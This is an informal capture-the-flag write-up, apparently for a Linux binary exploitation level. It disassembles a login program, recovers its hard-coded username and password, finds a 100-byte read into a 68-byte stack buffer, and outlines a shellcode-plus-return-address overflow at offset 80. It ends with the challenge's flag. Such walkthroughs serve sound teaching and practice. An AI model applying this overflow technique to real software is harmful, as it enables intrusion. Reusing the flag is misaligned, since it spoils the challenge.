# begin so let's strat to launc the program


********* ADMIN LOGIN PROMPT *********
Enter Username: asdf
verifying username....

nope, incorrect username...




so the program ask fo the username ans is not correct is print is not correct 

let's show the program inside :
.text:080484D0 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:080484D0                 public main
.text:080484D0 main            proc near               ; DATA XREF: _start+17↑o
.text:080484D0
.text:080484D0 argc            = dword ptr  8
.text:080484D0 argv            = dword ptr  0Ch
.text:080484D0 envp            = dword ptr  10h
.text:080484D0
.text:080484D0 ; __unwind {
.text:080484D0                 push    ebp
.text:080484D1                 mov     ebp, esp
.text:080484D3                 push    edi
.text:080484D4                 push    ebx
.text:080484D5                 and     esp, 0FFFFFFF0h
.text:080484D8                 sub     esp, 60h
.text:080484DB                 lea     ebx, [esp+1Ch]
.text:080484DF                 mov     eax, 0
.text:080484E4                 mov     edx, 10h
.text:080484E9                 mov     edi, ebx
.text:080484EB                 mov     ecx, edx
.text:080484ED                 rep stosd
.text:080484EF                 mov     dword ptr [esp+5Ch], 0
.text:080484F7                 mov     dword ptr [esp], offset aAdminLoginProm ; "********* ADMIN LOGIN PROMPT *********"
.text:080484FE                 call    _puts
.text:08048503                 mov     eax, offset aEnterUsername ; "Enter Username: "
.text:08048508                 mov     [esp], eax
.text:0804850B                 call    _printf
.text:08048510                 mov     eax, ds:stdin@@GLIBC_2_0
.text:08048515                 mov     [esp+8], eax
.text:08048519                 mov     dword ptr [esp+4], 100h
.text:08048521                 mov     dword ptr [esp], offset a_user_name
.text:08048528                 call    _fgets
.text:0804852D                 call    verify_user_name
.text:08048532                 mov     [esp+5Ch], eax
.text:08048536                 cmp     dword ptr [esp+5Ch], 0
.text:0804853B                 jz      short loc_8048550
.text:0804853D                 mov     dword ptr [esp], offset aNopeIncorrectU ; "nope, incorrect username...\n"
.text:08048544                 call    _puts
.text:08048549                 mov     eax, 1
.text:0804854E                 jmp     short loc_80485AF
.text:08048550 ; ---------------------------------------------------------------------------
.text:08048550
.text:08048550 loc_8048550:                            ; CODE XREF: main+6B↑j
.text:08048550                 mov     dword ptr [esp], offset aEnterPassword ; "Enter Password: "
.text:08048557                 call    _puts
.text:0804855C                 mov     eax, ds:stdin@@GLIBC_2_0
.text:08048561                 mov     [esp+8], eax
.text:08048565                 mov     dword ptr [esp+4], 64h ; 'd'
.text:0804856D                 lea     eax, [esp+1Ch]
.text:08048571                 mov     [esp], eax
.text:08048574                 call    _fgets
.text:08048579                 lea     eax, [esp+1Ch]
.text:0804857D                 mov     [esp], eax
.text:08048580                 call    verify_user_pass
.text:08048585                 mov     [esp+5Ch], eax
.text:08048589                 cmp     dword ptr [esp+5Ch], 0
.text:0804858E                 jz      short loc_8048597
.text:08048590                 cmp     dword ptr [esp+5Ch], 0
.text:08048595                 jz      short loc_80485AA
.text:08048597
.text:08048597 loc_8048597:                            ; CODE XREF: main+BE↑j
.text:08048597                 mov     dword ptr [esp], offset aNopeIncorrectP ; "nope, incorrect password...\n"
.text:0804859E                 call    _puts
.text:080485A3                 mov     eax, 1
.text:080485A8                 jmp     short loc_80485AF
.text:080485AA ; ---------------------------------------------------------------------------
.text:080485AA
.text:080485AA loc_80485AA:                            ; CODE XREF: main+C5↑j
.text:080485AA                 mov     eax, 0
.text:080485AF
.text:080485AF loc_80485AF:                            ; CODE XREF: main+7E↑j
.text:080485AF                                         ; main+D8↑j
.text:080485AF                 lea     esp, [ebp-8]
.text:080485B2                 pop     ebx
.text:080485B3                 pop     edi
.text:080485B4                 pop     ebp
.text:080485B5                 retn
.text:080485B5 ; } // starts at 80484D0
.text:080485B5 main       


so the program 

is set the buffer inside esp + 28 to 0 
lea     ebx, [esp+28]
mov     eax, 0
mov     edx, 16
mov     edi, ebx
mov     ecx, edx
rep stosd


put 0 inside the addres esp+92
mov     dword ptr [esp+92], 0


and print the value of the string admin login
mov     dword ptr [esp], offset aAdminLoginProm ; "********* ADMIN LOGIN PROMPT *********"
call    _puts

print enter Username:
mov     eax, offset aEnterUsername ; "Enter Username: "
mov     [esp], eax
call    _printf


put for the first the addres of the .bss buffer 
for the second 256 
for the last argument stind

so is copy 256 element from stdin and put inside the buffer in bss of the name a_user_name

mov     eax, ds:stdin@@GLIBC_2_0
mov     [esp+8], eax
mov     dword ptr [esp+4], 256
mov     dword ptr [esp], offset a_user_name
call    _fgets

.bss:0804A040                 public a_user_name
.bss:0804A040 a_user_name     db    ? ;               ; DATA XREF: verify_user_name+14↑o
.bss:0804A040                                         ; main+51↑o\

.bss:0804A0A2                 db    ? ;
.bss:0804A0A3                 db    ? ;
.bss:0804A0A3 _bss            ends

so the size if 

gef➤  p/d 0x0804A0A2-0x0804A040
$7 = 98

so the buffer of a_user_name is only a size of 98 octet


after is make a call to this function :
call    verify_user_name

public verify_user_name
verify_user_name proc near
; __unwind {
push    ebp
mov     ebp, esp
push    edi
push    esi
sub     esp, 10h
mov     dword ptr [esp], offset aVerifyingUsern ; "verifying username....\n"
call    _puts
mov     edx, offset a_user_name
mov     eax, offset aDatWil ; "dat_wil"
mov     ecx, 7
mov     esi, edx
mov     edi, eax
repe cmpsb
setnbe  dl
setb    al
mov     ecx, edx
sub     cl, al
mov     eax, ecx
movsx   eax, al
add     esp, 10h
pop     esi
pop     edi
pop     ebp
retn
; } // starts at 8048464
verify_user_name endp



so the only important thing here is make a comparaison of :
mov     edx, offset a_user_name
mov     eax, offset aDatWil ; "dat_wil"
mov     ecx, 7
mov     esi, edx
mov     edi, eax
repe cmpsb

is compare 7 octet from aDatWil like strncmp

setnbe  dl
setb    al
mov     ecx, edx
sub     cl, al
mov     eax, ecx
movsx   eax, al

and put the restult inside the eax 

and reset the stack


so the username is dat_wil


after is verify the result of the call the function if is 0
mov     [esp+5Ch], eax
cmp     dword ptr [esp+5Ch], 0
jz      short loc_8048550


if is zeros is continue with call the function verify_user_pass and verifiy the result
is get 100 element inside the buffer at position esp + 8

mov     dword ptr [esp], offset aEnterPassword ; "Enter Password: "
call    _puts
mov     eax, ds:stdin@@GLIBC_2_0
mov     [esp+8], eax
mov     dword ptr [esp+4], 64h ; 'd'
lea     eax, [esp+28]
mov     [esp], eax
call    _fgets
lea     eax, [esp+28]
mov     [esp], eax
call    verify_user_pass
mov     [esp+5Ch], eax
cmp     dword ptr [esp+5Ch], 0
jz      short loc_8048597






the function verify_user_pass :
; __unwind {
push    ebp
mov     ebp, esp
push    edi
push    esi
mov     eax, [ebp+arg_0]
mov     edx, eax
mov     eax, offset aAdmin ; "admin"
mov     ecx, 5
mov     esi, edx
mov     edi, eax
repe cmpsb
setnbe  dl
setb    al
mov     ecx, edx
sub     cl, al
mov     eax, ecx
movsx   eax, al
pop     esi
pop     edi
pop     ebp
retn
; } // st



is compare the first 5 octet with "admin"


so the password is admin:

after is return to the stack verify the result with 0 

if is 0 is compare with the previus call of the function 
cmp     dword ptr [esp+92], 0
jz      short loc_80485AA

and is correc put 0 inside eax 
loc_80485AA:
mov     eax, 0

and restore the stack
loc_80485AF:
lea     esp, [ebp-8]
pop     ebx
pop     edi
pop     ebp
retn
; } // starts at 80484D0
main endp


the exploit is because inside the second call of fgets is read 100 octet and 
put the element insude the stack buffer but the stack buffer is acctually of size 
96 - 28 = 68 octet 
but because you are variable at position mov     [esp+92], eax



mov     eax, ds:stdin@@GLIBC_2_0
mov     [esp+8], eax
mov     dword ptr [esp+4], 100
lea     eax, [esp+28]
mov     [esp], eax
call    _fgets


so here the probelm is copy more element than the size of the buffer


so go to create a cycly pattern for the second argument to find the offset:

and found a offset of 80:
gef➤  pattern search $eip
[+] Searching for '75616161'/'61616175' with period=4
[+] Found at offset 80 (little-endian search) likely



destination :
info variable 


0x0804a040  a_user_name


so input 1 = data_wil + shellcode
so input 2 = a * 80 + addr


AND GET THE FLAG
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv